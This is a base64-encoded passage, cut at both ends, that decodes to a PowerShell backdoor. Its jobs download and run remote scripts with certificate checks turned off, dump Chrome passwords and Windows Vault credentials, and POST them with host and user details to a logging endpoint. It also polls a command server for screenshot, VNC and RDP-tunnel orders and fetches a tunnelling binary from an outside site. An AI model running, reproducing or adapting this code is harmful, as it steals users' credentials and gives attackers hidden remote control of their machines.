ZmFsc2UpIHsKCWJlZ2luIHsKCQkkZGF0YSA9IEAoKQoJfQoJcHJvY2Vzc3sKCQkkZGF0YSArPSAkXwoJfQoJCgllbmR7CgkKCQlpZiAoJGRhdGEubGVuZ3RoIC1lcSAxIC1hbmQgJGZvcmNlQXJyYXkgLWVxICRmYWxzZSkgewoJCQkkdmFsdWUgPSAkZGF0YVswXQoJCX0gZWxzZSB7CQoJCQkkdmFsdWUgPSAkZGF0YQoJCX0KCgkJaWYgKCR2YWx1ZSAtZXEgJG51bGwpIHsKCQkJcmV0dXJuICJudWxsIgoJCX0KCgkJCgoJCSRkYXRhVHlwZSA9ICR2YWx1ZS5HZXRUeXBlKCkuTmFtZQoJCQoJCXN3aXRjaCAtcmVnZXggKCRkYXRhVHlwZSkgewoJICAgICAgICAgICAgJ1N0cmluZycgIHsKCQkJCQlyZXR1cm4gICJgInswfWAiIiAtZiAoRXNjYXBlLUpTT05TdHJpbmcgJHZhbHVlICkKCQkJCX0KCSAgICAgICAgICAgICcoU3lzdGVtXC4pP0RhdGVUaW1lJyAge3JldHVybiAgImAiezA6eXl5eS1NTS1kZH1UezA6SEg6bW06c3N9YCIiIC1mICR2YWx1ZX0KCSAgICAgICAgICAgICdJbnQzMnxEb3VibGUnIHtyZXR1cm4gICIkdmFsdWUifQoJCQkJJ0Jvb2xlYW4nIHtyZXR1cm4gICIkdmFsdWUiLlRvTG93ZXIoKX0KCSAgICAgICAgICAgICcoU3lzdGVtXC4pP09iamVjdFxbXF0nIHsgIyBhcnJheQoJCQkJCQoJCQkJCWlmICgkbWF4RGVwdGggLWxlIDApe3JldHVybiAiYCIkdmFsdWVgIiJ9CgkJCQkJCgkJCQkJJGpzb25SZXN1bHQgPSAnJwoJCQkJCWZvcmVhY2goJGVsZW0gaW4gJHZhbHVlKXsKCQkJCQkJI2lmICgkZWxlbSAtZXEgJG51bGwpIHtjb250aW51ZX0KCQkJCQkJaWYgKCRqc29uUmVzdWx0Lkxlbmd0aCAtZ3QgMCkgeyRqc29uUmVzdWx0ICs9JywgJ30JCQkJCgkJCQkJCSRqc29uUmVzdWx0ICs9ICgkZWxlbSB8IENvbnZlcnRUby1KU09OIC1tYXhEZXB0aCAoJG1heERlcHRoIC0xKSkKCQkJCQl9CgkJCQkJcmV0dXJuICJbIiArICRqc29uUmVzdWx0ICsgIl0iCgkgICAgICAgICAgICB9CgkJCQknKFN5c3RlbVwuKT9IYXNodGFibGUnIHsgIyBoYXNodGFibGUKCQkJCQkkanNvblJlc3VsdCA9ICcnCgkJCQkJZm9yZWFjaCgka2V5IGluICR2YWx1ZS5LZXlzKXsKCQkJCQkJaWYgKCRqc29uUmVzdWx0Lkxlbmd0aCAtZ3QgMCkgeyRqc29uUmVzdWx0ICs9JywgJ30KCQkJCQkJJGpzb25SZXN1bHQgKz0gCkAiCgkiezB9IjogezF9CiJAIC1mICRrZXkgLCAoJHZhbHVlWyRrZXldIHwgQ29udmVydFRvLUpTT04gLW1heERlcHRoICgkbWF4RGVwdGggLTEpICkKCQkJCQl9CgkJCQkJcmV0dXJuICJ7IiArICRqc29uUmVzdWx0ICsgIn0iCgkJCQl9CgkgICAgICAgICAgICBkZWZhdWx0IHsgI29iamVjdAoJCQkJCWlmICgkbWF4RGVwdGggLWxlIDApe3JldHVybiAgImAiezB9YCIiIC1mIChFc2NhcGUtSlNPTlN0cmluZyAkdmFsdWUpfQoJCQkJCQoJCQkJCXJldHVybiAieyIgKwoJCQkJCQkoKCR2YWx1ZSB8IEdldC1NZW1iZXIgLU1lbWJlclR5cGUgKnByb3BlcnR5IHwgJSB7IApAIgoJInswfSI6IHsxfQoiQCAtZiAkXy5OYW1lICwgKCR2YWx1ZS4oJF8uTmFtZSkgfCBDb252ZXJ0VG8tSlNPTiAtbWF4RGVwdGggKCRtYXhEZXB0aCAtMSkgKQkJCQoJCQkJCQoJCQkJCX0pIC1qb2luICcsICcpICsgIn0iCgkgICAgCQl9CgkJfQoJfQp9CgogICAgICAgICAgICAkdXJsID0gJGFyZ3NbMF0KICAgICAgICAgICAgCiAgICAgICAgICAgICRyZXNvbHV0aW9uID0gJGFyZ3NbMV0KICAgICAgICAgICAgJGRvbWFpbiA9ICRhcmdzWzJdCiAgICAgICAgICAgICRjb21wdXRlcl9uYW1lID0gJGFyZ3NbM10KICAgICAgICAgICAgJHVzZXJuYW1lID0gJGFyZ3NbNF0KICAgICAgICAgICAgJHRpbWV6b25lID0gJGFyZ3NbNV0KICAgICAgICAgICAgJGhhc2hpZCA9ICRhcmdzWzZdCiAgICAgICAgICAgICR2ZXJzaW9uID0gJGFyZ3NbN10gICAgCiAgICAgICAgCgogICAgICAgIFtTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjayA9IHsgJHRydWUgfQogICAgICAgICYgY21kIC9jICVzeXN0ZW1yb290JVxzeXN0ZW0zMlx3aW5kb3dzcG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlICJbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7IGAkdHJ1ZSB9OyBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vd3N1c3VwZGF0ZS5jb20vc2NyaXB0P2lkPXJhbmRvbSZuYW1lPWNocm9tZScpOyBTdG9wLVByb2Nlc3MgLW5hbWUgY2hyb21lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyBTdGFydC1zbGVlcCAtc2Vjb25kcyAzOyBHZXQtQ2hyb21lRHVtcCAtT3V0RmlsZSAkZW52OnRlbXBcY2hyb21lLmxvZzsgRXhpdCIKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNjAKICAgICAgICAgICAgSWYgKFRlc3QtUGF0aCAiJGVudjp0ZW1wXGNocm9tZS5sb2ciKSB7IAogICAgICAgICAgICAjJGNvbnRlbnQgPSBbSU8uRmlsZV06OlJlYWRBbGxUZXh0KCIkZW52OnRlbXBcY2hyb21lLmxvZyIpCiAgICAgICAgICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgIiRlbnY6dGVtcFxjaHJvbWUubG9nIiB8IE91dC1TdHJpbmcKICAgICAgICAgICAgJGNvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRjb250ZW50KSkKICAgICAgICAgICAgJGpzb24gPSBAeyJyZXNvbHV0aW9uIiA9ICRyZXNvbHV0aW9uOyAiZG9tYWluIiA9ICRkb21haW47ICJjb21wdXRlcl9uYW1lIiA9ICRjb21wdXRlcl9uYW1lOyAidXNlcm5hbWUiID0gJHVzZXJuYW1lOyAidGltZXpvbmUiID0gJHRpbWV6b25lOyAiaGFzaGlkIiA9ICRoYXNoaWQ7ICJ2ZXJzaW9uIiA9ICR2ZXJzaW9uOyAiY29udGVudCIgPSAkY29udGVudDsgInR5cGUiID0gImNoYnJ3cHdkIn0KICAgICAgICAgICAgJGxvZ19qc29uID0gJGpzb24gfCBDb252ZXJ0VG8tSnNvbgogICAgICAgICAgICAkYnVmZmVyID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkbG9nX2pzb24pCiAgICAgICAgICAgIHdyaXRlLWhvc3QgJGJ1ZmZlcgogICAgICAgICAgICAkdXJsKycvcHNobG9nJwogICAgICAgICAgICBbU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF0gJHdlYlJlcXVlc3QgPSBbU3lzdGVtLk5ldC5XZWJSZXF1ZXN0XTo6Q3JlYXRlKCR1cmwrJy9wc2hsb2cnKQogICAgICAgICAgICAkd2ViUmVxdWVzdC5Db250ZW50VHlwZSA9ICJhcHBsaWNhdGlvbi9qc29uIgogICAgICAgICAgICAkd2ViUmVxdWVzdC5UaW1lb3V0ID0gMTAwMDAKICAgICAgICAgICAgJHdlYlJlcXVlc3QuTWV0aG9kID0gIlBPU1QiCiAgICAgICAgICAgICR3ZWJSZXF1ZXN0LkNvbnRlbnRMZW5ndGggPSAkYnVmZmVyLkxlbmd0aDsKCgogICAgICAgICAgICAkcmVxdWVzdFN0cmVhbSA9ICR3ZWJSZXF1ZXN0LkdldFJlcXVlc3RTdHJlYW0oKQogICAgICAgICAgICAkcmVxdWVzdFN0cmVhbS5Xcml0ZSgkYnVmZmVyLCAwLCAkYnVmZmVyLkxlbmd0aCkKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uRmx1c2goKQogICAgICAgICAgICAkcmVxdWVzdFN0cmVhbS5DbG9zZSgpCgogICAgICAgICAgICBbU3lzdGVtLk5ldC5IdHRwV2ViUmVzcG9uc2VdICR3ZWJSZXNwb25zZSA9ICR3ZWJSZXF1ZXN0LkdldFJlc3BvbnNlKCkKICAgICAgICAgICAgJHN0cmVhbVJlYWRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVJlYWRlcigkd2ViUmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkKICAgICAgICAgICAgJHJlc3VsdCA9ICRzdHJlYW1SZWFkZXIuUmVhZFRvRW5kKCkKICAgICAgICAgICAgfQogICAgICAgICAgICB9IC1Bcmd1bWVudExpc3QgJHBhcmFtcy51cmwsICRwYXJhbXMucmVzb2x1dGlvbiwgJHBhcmFtcy5kb21haW4sICRwYXJhbXMuY29tcHV0ZXJfbmFtZSwgJHBhcmFtcy51c2VybmFtZSwgJHBhcmFtcy50aW1lem9uZSwgJHBhcmFtcy5oYXNoaWQsICRwYXJhbXMudmVyc2lvbgogICAgICAgIH0KCmZ1bmN0aW9uIEdldFZhdWx0IHsKICAgIFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgewogICAgICAgZnVuY3Rpb24gRXNjYXBlLUpTT05TdHJpbmcoJHN0cil7CglpZiAoJHN0ciAtZXEgJG51bGwpIHtyZXR1cm4gIiJ9Cgkkc3RyID0gJHN0ci5Ub1N0cmluZygpLlJlcGxhY2UoJyInLCdcIicpLlJlcGxhY2UoJ1wnLCdcXCcpLlJlcGxhY2UoImBuIiwnXG4nKS5SZXBsYWNlKCJgciIsJ1xyJykuUmVwbGFjZSgiYHQiLCdcdCcpCglyZXR1cm4gJHN0cjsKfQoKICAgIGZ1bmN0aW9uIENvbnZlcnRUby1KU09OKCRtYXhEZXB0aCA9IDQsJGZvcmNlQXJyYXkgPSAkZmFsc2UpIHsKCWJlZ2luIHsKCQkkZGF0YSA9IEAoKQoJfQoJcHJvY2Vzc3sKCQkkZGF0YSArPSAkXwoJfQoJCgllbmR7CgkKCQlpZiAoJGRhdGEubGVuZ3RoIC1lcSAxIC1hbmQgJGZvcmNlQXJyYXkgLWVxICRmYWxzZSkgewoJCQkkdmFsdWUgPSAkZGF0YVswXQoJCX0gZWxzZSB7CQoJCQkkdmFsdWUgPSAkZGF0YQoJCX0KCgkJaWYgKCR2YWx1ZSAtZXEgJG51bGwpIHsKCQkJcmV0dXJuICJudWxsIgoJCX0KCgkJCgoJCSRkYXRhVHlwZSA9ICR2YWx1ZS5HZXRUeXBlKCkuTmFtZQoJCQoJCXN3aXRjaCAtcmVnZXggKCRkYXRhVHlwZSkgewoJICAgICAgICAgICAgJ1N0cmluZycgIHsKCQkJCQlyZXR1cm4gICJgInswfWAiIiAtZiAoRXNjYXBlLUpTT05TdHJpbmcgJHZhbHVlICkKCQkJCX0KCSAgICAgICAgICAgICcoU3lzdGVtXC4pP0RhdGVUaW1lJyAge3JldHVybiAgImAiezA6eXl5eS1NTS1kZH1UezA6SEg6bW06c3N9YCIiIC1mICR2YWx1ZX0KCSAgICAgICAgICAgICdJbnQzMnxEb3VibGUnIHtyZXR1cm4gICIkdmFsdWUifQoJCQkJJ0Jvb2xlYW4nIHtyZXR1cm4gICIkdmFsdWUiLlRvTG93ZXIoKX0KCSAgICAgICAgICAgICcoU3lzdGVtXC4pP09iamVjdFxbXF0nIHsgIyBhcnJheQoJCQkJCQoJCQkJCWlmICgkbWF4RGVwdGggLWxlIDApe3JldHVybiAiYCIkdmFsdWVgIiJ9CgkJCQkJCgkJCQkJJGpzb25SZXN1bHQgPSAnJwoJCQkJCWZvcmVhY2goJGVsZW0gaW4gJHZhbHVlKXsKCQkJCQkJI2lmICgkZWxlbSAtZXEgJG51bGwpIHtjb250aW51ZX0KCQkJCQkJaWYgKCRqc29uUmVzdWx0Lkxlbmd0aCAtZ3QgMCkgeyRqc29uUmVzdWx0ICs9JywgJ30JCQkJCgkJCQkJCSRqc29uUmVzdWx0ICs9ICgkZWxlbSB8IENvbnZlcnRUby1KU09OIC1tYXhEZXB0aCAoJG1heERlcHRoIC0xKSkKCQkJCQl9CgkJCQkJcmV0dXJuICJbIiArICRqc29uUmVzdWx0ICsgIl0iCgkgICAgICAgICAgICB9CgkJCQknKFN5c3RlbVwuKT9IYXNodGFibGUnIHsgIyBoYXNodGFibGUKCQkJCQkkanNvblJlc3VsdCA9ICcnCgkJCQkJZm9yZWFjaCgka2V5IGluICR2YWx1ZS5LZXlzKXsKCQkJCQkJaWYgKCRqc29uUmVzdWx0Lkxlbmd0aCAtZ3QgMCkgeyRqc29uUmVzdWx0ICs9JywgJ30KCQkJCQkJJGpzb25SZXN1bHQgKz0gCkAiCgkiezB9IjogezF9CiJAIC1mICRrZXkgLCAoJHZhbHVlWyRrZXldIHwgQ29udmVydFRvLUpTT04gLW1heERlcHRoICgkbWF4RGVwdGggLTEpICkKCQkJCQl9CgkJCQkJcmV0dXJuICJ7IiArICRqc29uUmVzdWx0ICsgIn0iCgkJCQl9CgkgICAgICAgICAgICBkZWZhdWx0IHsgI29iamVjdAoJCQkJCWlmICgkbWF4RGVwdGggLWxlIDApe3JldHVybiAgImAiezB9YCIiIC1mIChFc2NhcGUtSlNPTlN0cmluZyAkdmFsdWUpfQoJCQkJCQoJCQkJCXJldHVybiAieyIgKwoJCQkJCQkoKCR2YWx1ZSB8IEdldC1NZW1iZXIgLU1lbWJlclR5cGUgKnByb3BlcnR5IHwgJSB7IApAIgoJInswfSI6IHsxfQoiQCAtZiAkXy5OYW1lICwgKCR2YWx1ZS4oJF8uTmFtZSkgfCBDb252ZXJ0VG8tSlNPTiAtbWF4RGVwdGggKCRtYXhEZXB0aCAtMSkgKQkJCQoJCQkJCQoJCQkJCX0pIC1qb2luICcsICcpICsgIn0iCgkgICAgCQl9CgkJfQoJfQp9CgogICAgICAgICAgICAkdXJsID0gJGFyZ3NbMF0KICAgICAgICAgICAgJHJlc29sdXRpb24gPSAkYXJnc1sxXQogICAgICAgICAgICAkZG9tYWluID0gJGFyZ3NbMl0KICAgICAgICAgICAgJGNvbXB1dGVyX25hbWUgPSAkYXJnc1szXQogICAgICAgICAgICAkdXNlcm5hbWUgPSAkYXJnc1s0XQogICAgICAgICAgICAkdGltZXpvbmUgPSAkYXJnc1s1XQogICAgICAgICAgICAkaGFzaGlkID0gJGFyZ3NbNl0KICAgICAgICAgICAgJHZlcnNpb24gPSAkYXJnc1s3XSAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgJHZhdWx0X3VybCA9ICR1cmwrJy9zY3JpcHQ/aWQ9cmFuZG9tJm5hbWU9dmF1bHQnCiAgICAgICAgICAgIFdyaXRlLWhvc3QgJHZhdWx0X3VybAogICAgICAgICAgICBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7ICR0cnVlIH0KICAgICAgICAgICAgSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCR2YXVsdF91cmwpOyBHZXQtVmF1bHRDcmVkZW50aWFsIC1PdXRWYXJpYWJsZSB2YXVsdGNyZWRzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICNXcml0ZS1ob3N0ICdFUlJPUicKICAgICAgICAgICAgIyR2YXVsdGNyZWRzZXJyb3IKICAgICAgICAgICAgJHZhdWx0Y3JlZHMgPSAkdmF1bHRjcmVkcyB8IE91dC1TdHJpbmcKICAgICAgICAgICAgJGNvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR2YXVsdGNyZWRzKSkKICAgICAgICAgICAgaWYgKCRjb250ZW50Lmxlbmd0aCAtbmUgMCkgewogICAgICAgICAgICAgICAgJGpzb24gPSBAeyJyZXNvbHV0aW9uIiA9ICRyZXNvbHV0aW9uOyAiZG9tYWluIiA9ICRkb21haW47ICJjb21wdXRlcl9uYW1lIiA9ICRjb21wdXRlcl9uYW1lOyAidXNlcm5hbWUiID0gJHVzZXJuYW1lOyAidGltZXpvbmUiID0gJHRpbWV6b25lOyAiaGFzaGlkIiA9ICRoYXNoaWQ7ICJ2ZXJzaW9uIiA9ICR2ZXJzaW9uOyAiY29udGVudCIgPSAkY29udGVudDsgInR5cGUiID0gInZhdWx0In0KICAgICAgICAgICAgICAgICRqc29uCiAgICAgICAgICAgICAgICAkbG9nX2pzb24gPSAkanNvbiB8IENvbnZlcnRUby1Kc29uCgogICAgICAgICAgICAgICAgJGJ1ZmZlciA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGxvZ19qc29uKQogICAgICAgICAgICAgICAgd3JpdGUtaG9zdCAkYnVmZmVyCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtTeXN0ZW0uTmV0Lkh0dHBXZWJSZXF1ZXN0XSAkd2ViUmVxdWVzdCA9IFtTeXN0ZW0uTmV0LldlYlJlcXVlc3RdOjpDcmVhdGUoJHVybCsnL3BzaGxvZycpCiAgICAgICAgICAgICAgICAkd2ViUmVxdWVzdC5Db250ZW50VHlwZSA9ICJhcHBsaWNhdGlvbi9qc29uIgogICAgICAgICAgICAgICAgJHdlYlJlcXVlc3QuVGltZW91dCA9IDEwMDAwCiAgICAgICAgICAgICAgICAkd2ViUmVxdWVzdC5NZXRob2QgPSAiUE9TVCIKICAgICAgICAgICAgICAgICR3ZWJSZXF1ZXN0LkNvbnRlbnRMZW5ndGggPSAkYnVmZmVyLkxlbmd0aDsKCgogICAgICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0gPSAkd2ViUmVxdWVzdC5HZXRSZXF1ZXN0U3RyZWFtKCkKICAgICAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtLldyaXRlKCRidWZmZXIsIDAsICRidWZmZXIuTGVuZ3RoKQogICAgICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uQ2xvc2UoKQoKICAgICAgICAgICAgICAgIFtTeXN0ZW0uTmV0Lkh0dHBXZWJSZXNwb25zZV0gJHdlYlJlc3BvbnNlID0gJHdlYlJlcXVlc3QuR2V0UmVzcG9uc2UoKQogICAgICAgICAgICAgICAgJHN0cmVhbVJlYWRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVJlYWRlcigkd2ViUmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkKICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkc3RyZWFtUmVhZGVyLlJlYWRUb0VuZCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gLUFyZ3VtZW50TGlzdCAkcGFyYW1zLnVybCwgJHBhcmFtcy5yZXNvbHV0aW9uLCAkcGFyYW1zLmRvbWFpbiwgJHBhcmFtcy5jb21wdXRlcl9uYW1lLCAkcGFyYW1zLnVzZXJuYW1lLCAkcGFyYW1zLnRpbWV6b25lLCAkcGFyYW1zLmhhc2hpZCwgJHBhcmFtcy52ZXJzaW9uCiAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgIAogICAgCgpmdW5jdGlvbiBXZWJHZXQgewogICAgU3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7CiAgICAgICAgICAgICR1cmwgPSAkYXJnc1swXQogICAgICAgICAgICAkcmVzb2x1dGlvbiA9ICRhcmdzWzFdCiAgICAgICAgICAgICRkb21haW4gPSAkYXJnc1syXQogICAgICAgICAgICAkY29tcHV0ZXJfbmFtZSA9ICRhcmdzWzNdCiAgICAgICAgICAgICR1c2VybmFtZSA9ICRhcmdzWzRdCiAgICAgICAgICAgICR0aW1lem9uZSA9ICRhcmdzWzVdCiAgICAgICAgICAgICRoYXNoaWQgPSAkYXJnc1s2XQogICAgICAgICAgICAkdmVyc2lvbiA9ICRhcmdzWzddICAgICAgCiAgICAgICAgd2hpbGUgKCR0cnVlKSB7CiAgICAgICAgICAgICRXZWJDbGllbnQ9TmV3LU9iamVjdCBuZXQud2ViY2xpZW50CiAgICAgICAgICAgIFtTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjayA9IHsgJHRydWUgfQogICAgICAgICAgICAkU3RyaW5nPSRXZWJDbGllbnQuRG93bmxvYWRTdHJpbmcoJHVybCsiL2NvbW1hbmQ/ZG9tYWluPSRkb21haW4mdXNlcm5hbWU9JHVzZXJuYW1lJmhhc2hpZD0kaGFzaGlkJmNvbXB1dGVyX25hbWU9JGNvbXB1dGVyX25hbWUmdmVyPSR2ZXJzaW9uIikKICAgICAgICAgICAgaWYgKCRTdHJpbmcgLW5lICcwJykgeyAKICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRjbWQgaW4gKCRzdHJpbmcgLXNwbGl0ICdbIlxuXHIifCJcclxuInxcbnxccl0nKSkgewogICAgICAgICAgICAgICAgICAgaWYgKCRjbWQuU3RhcnRzV2l0aCgiK3NjcmVlbnNob3QiLDEpKSB7ICRjbWQgfCBPdXQtRmlsZSAkZW52OnRlbXBca2V5d29yZHMudHh0IH0KICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJGNtZC5TdGFydHNXaXRoKCItc2NyZWVuc2hvdCIsMSkpIHsgUmVtb3ZlLUl0ZW0gJGVudjp0ZW1wXGtleXdvcmRzLnR4dCB9CiAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRjbWQuU3RhcnRzV2l0aCgiK3ZuYyIsIDEpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKFtJbnRQdHJdOjpTaXplIC1lcSA4KSB7IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJiBjbWQgL2MgJXN5c3RlbXJvb3QlXHN5c3dvdzY0XHdpbmRvd3Nwb3dlcnNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgIltTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjayA9IHsgYCR0cnVlIH07IElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnJHVybC9zY3JpcHQ/aWQ9MSZuYW1lPXZuYycpOyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7ICYgY21kIC9jICVzeXN0ZW1yb290JVxzeXN0ZW0zMlx3aW5kb3dzcG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlICJbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7IGAkdHJ1ZSB9OyBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJyR1cmwvc2NyaXB0P2lkPTEmbmFtZT12bmMnKTsiIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIyArcmRwIHVzZXJuYW1lO3Bhc3N3b3JkO3RyaWdnZXItcG9ydDsxMC4wLjAuMQogICAgICAgICAgICAgICAgICAgZWxzZWlmICgkY21kLlN0YXJ0c1dpdGgoIityZHAiLCAxKSkgeyAKICAgICAgICAgICAgICAgICAgICAgICAgJGNyZWRzID0gKCRjbWQuc3BsaXQoJyAnKSlbMV0KICAgICAgICAgICAgICAgICAgICAgICAgJHBsaW5rX3VzZXJuYW1lID0gICgkY3JlZHMuc3BsaXQoJzsnKSlbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJHBsaW5rX3Bhc3N3b3JkID0gKCRjcmVkcy5zcGxpdCgnOycpKVsxXQogICAgICAgICAgICAgICAgICAgICAgICAkcGxpbmtfdHJpZ2dlcl9wb3J0ID0gKCRjcmVkcy5zcGxpdCgnOycpKVsyXQogICAgICAgICAgICAgICAgICAgICAgICAkcGxpbmtfaXAgPSAoJGNyZWRzLnNwbGl0KCc7JykpWzNdCiAgICAgICAgICAgICAgICAgICAgICAgICRwbGlua191c2VybmFtZSwgJHBsaW5rX3Bhc3N3b3JkLCAkcGxpbmtfdHJpZ2dlcl9wb3J0LCAkcGxpbmtfaXAKICAgICAgICAgICAgICAgICAgICAgICAgU3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7IAogICAgICAgICAgICAgICAgICAgICAgICAjSUYgKChUZXN0LVBhdGggIiRlbnY6dGVtcFxwbGluay5leGUiKSAtZXEgJEZhbHNlKSB7IChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHBzOi8vdGhlLmVhcnRoLmxpL35zZ3RhdGhhbS9wdXR0eS9sYXRlc3QveDg2L3BsaW5rLmV4ZScsICIkZW52OnRlbXBccGxpbmsuZXhlIik7fQogICAgICAgICAgICAgICAgICAgICAgICBJRiAoKFRlc3QtUGF0aCAiJGVudjp0ZW1wXHN0bmxjLmV4ZSIpIC1lcSAkRmFsc2UpIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHA6Ly9zeWx2aWFib2RlbmhlaW1lci5jaC9jc3Mvc3RubGMuYmluJywgIiRlbnY6dGVtcFxzdG5sYy5leGUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cDovL3N5bHZpYWJvZGVuaGVpbWVyLmNoL2Nzcy9DaVdpbkNuZzMyLmRsbCcsICIkZW52OnRlbXBcQ2lXaW5DbmczMi5kbGwiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkcGxpbmtfdXNlcm5hbWUgPSAkYXJnc1swXQogICAgICAgICAgICAgICAgICAgICAgICAkcGxpbmtfcGFzc3dvcmQgPSAkYXJnc1sxXQogICAgICAgICAgICAgICAgICAgICAgICAkcGxpbmtfdHJpZ2dlcl9wb3J0ID0gJGFyZ3NbMl0KICAgICAgICAgICAgICAgICAgICAgICAgJHBsaW5rX2lwID0gJGFyZ3NbM10KICAgICAgICAgICAgICAgICAgICAgICAgU3RvcC1Qcm9jZXNzIC1uYW1lIHN0bmxjIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICMmIGNtZCAvYyAiZWNobyB5ZXMgfCAkZW52OnRlbXBccGxpbmsuZXhlIC1SICIrJHBsaW5rX3RyaWdnZXJfcG9ydCsiOjEyNy4wLjAuMTozMzg5IC1sICRwbGlua191c2VybmFtZSAtcHcgJHBsaW5rX3Bhc3N3b3JkICRwbGlua19pcCAtTiIgfSAtQXJndW1lbnRMaXN0ICRwbGlua191c2VybmFtZSwgJHBsaW5rX3Bhc3N3b3JkLCAkcGxpbmtfdHJpZ2dlcl9wb3J0LCAkcGxpbmtfaXAgfQogICAgICAgICAgICAgICAgICAgICAgICAmIGNtZCAvYyAiZWNobyBTIHwgJGVudjp0ZW1wXHN0bmxjLmV4ZSAkcGxpbmtfdXNlcm5hbWVAJHBsaW5rX2lwIC1zMmM9MC4wLjAuMCwkcGxpbmtfdHJpZ2dlcl9wb3J0LGxvY2FsaG9zdCwzMzg5IC1wdz0kcGxpbmtfcGFzc3dvcmQiCiAgICAgICAgICAgICAgICAgICAgICAgICYgY21kIC9jICIkZW52OnRlbXBcc3RubGMuZXhlICRwbGlua191c2VybmFtZUAkcGxpbmtfaXAgLXMyYz0wLjAuMC4wLCRwbGlua190cmlnZ2VyX3BvcnQsbG9jYWxob3N0LDMzODkgLXB3PSRwbGlua19wYXNzd29yZCAtdW5hdD15IgogICAgICAgICAgICAgICAgICAgICAgICB9IC1Bcmd1bWVudExpc3QgJHBsaW5rX3VzZXJuYW1lLCAkcGxpbmtfcGFzc3dvcmQsICRwbGlua190cmlnZ2VyX3BvcnQsICRwbGlua19pcCB9CiAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRjbWQgLW5lICcnKSB7IFN0